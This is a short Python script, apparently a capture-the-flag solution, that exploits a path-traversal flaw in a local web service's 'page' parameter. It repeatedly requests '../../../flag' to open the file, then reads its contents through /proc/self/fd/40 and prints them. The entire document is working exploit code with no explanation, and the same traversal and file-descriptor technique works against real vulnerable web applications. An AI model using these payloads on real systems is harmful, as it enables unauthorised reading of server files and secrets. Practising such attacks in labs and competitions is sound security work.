import requests

for _ in range(30):
    requests.get("http://127.0.0.1:62333/?page=../../../../../../../../../../flag")

flag = requests.get("http://127.0.0.1:62333/?page=../../../../../../../../../../proc/self/fd/40").text
print(flag)
